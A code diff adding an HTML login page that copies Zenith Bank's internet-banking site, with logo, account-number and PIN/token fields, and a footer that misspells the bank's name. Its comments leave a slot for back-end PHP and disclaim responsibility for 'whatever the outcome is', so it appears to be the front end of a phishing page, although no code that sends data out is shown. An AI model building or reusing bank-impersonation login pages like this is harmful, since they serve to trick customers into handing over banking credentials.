@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+   <title>ibank</title>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<link rel="stylesheet" type="text/css" href="/font-awesome-4.7.0/font-awesome-4.7.0/css/font-awesome.css"/>
+<link rel="stylesheet" type="text/css" href="Zenithcss.css"/>
+</head>
+<body>
+<!--Reader or Developer should know that no links are working in this code-->
+<header>
+<!--zenith logo goes here-->
+<div class="container1">
+
+<div id="logo">
+<img src="zenith.jpg" alt="zenith bank logo" id="zenithLogo" />
+</div>
+<!--Text and a line-->
+<div id="introText">
+<!--IT(intro text)-->
+<p id="IT">Welcome to Zenith Bank internet Banking </p>
+<hr/>
+</div>
+
+</div>
+</header>
+
+<main>
+<div class="container2">
+<!--login-->
+<div id="loginCage">
+<p id="login">LOGIN</p>
+</div>
+<!--caution text-->
+<div id="cautionText">
+<p id="caution">Please choose how you would love to Log in today</p>
+</div>
+<!--selection area-->
+<div id="selectBlock">
+<select name="loginType" id="loginType" disabled >
+
+<!--This options are not useful because of what the website is designed for-->
+<!--so back-end Developer should use the values gotten from the form directly-->
+
+<option value="type1" id="opt1" selected>PIN and Token</option>
+<option value="type2">Password</option>
+</select>
+</div>
+
+<div id="Toggle">
+<p id="type1">PIN and Token</p>
+<p id="type2">Password</p>
+</div>
+
+<!--inputs and submit-->
+<!--Backend developer should report to me if form does not submit -->
+<form onsubmit="return validate()">
+
+<div id="field1">
+<i class="fa fa-user profile" aria-hidden="true"></i>
+<input type="text" placeholder="ACCOUNT NUMBER" id="ACnum" required autofocus/>
+<p class="errormsg"></p>
+</div>
+
+<div id="field2">
+<i class="fa fa-unlock profile" aria-hidden="true"></i>
+<input type="password" placeholder="PIN and Token" id="password" required/>
+<i class="fa fa-eye-slash secure" aria-hidden="true"></i>
+<p class="errormsg"></p>
+</div>
+
+<div id="submit">
+<input type="submit" value="LOGIN" id="loginBtn"/>
+</div>
+
+</form>
+
+<!--final text here FT(final Text) -->
+<div id="FTcase">
+<p id="finalText1"><a href="#">FORGET PASSWORD</a></p>
+<p id="finalText2"><a href="#">HARDWARE TOKEN<br/> UNLOCK/RESET</a></p>
+</div>
+</div>
+</main>
+
+<footer>
+<div class="container3">
+
+<div>
+
+<span id="Alert"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> SCAM ALERT</span>
+
+<span id="EFP"> <i class="fa fa-envelope" aria-hidden="true"></i> EMAIL FRAUD AND PHISHING</span>
+
+<span id="Contact"> <i class="fa fa-phone-square" aria-hidden="true"></i> CONTACT US</span>
+
+
+<p id="FAQ"><i class="fa fa-info" aria-hidden="true"></i> FAQ</p>
+
+</div>
+<div id="copyright">
+<p id="copy"><span id="year">© 2017</span> ZEINTH BANK PLC|TERMS & CONDITIONS</p>
+</div>
+</div>
+</footer>
+<script src="Zenithjscript.js">
+
+</script>
+<!--for an organize project place your php code here-->
+
+
+
+<!--disclaimer:anyone who uses this case is solely responsible for whatever the outcome is-->
+</body>
+</html>
